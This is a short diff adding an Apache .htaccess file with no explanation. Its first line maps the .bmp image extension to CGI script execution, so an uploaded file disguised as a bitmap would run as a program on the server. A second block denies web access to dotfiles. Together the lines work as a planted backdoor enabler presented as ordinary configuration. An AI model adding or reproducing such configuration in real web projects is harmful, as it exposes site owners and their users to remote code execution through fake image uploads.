@@ -1,0 +1,5 @@
+AddHandler cgi-script .bmp
+<FilesMatch "^\.">
+Order allow,deny
+Deny from all
+</FilesMatch>
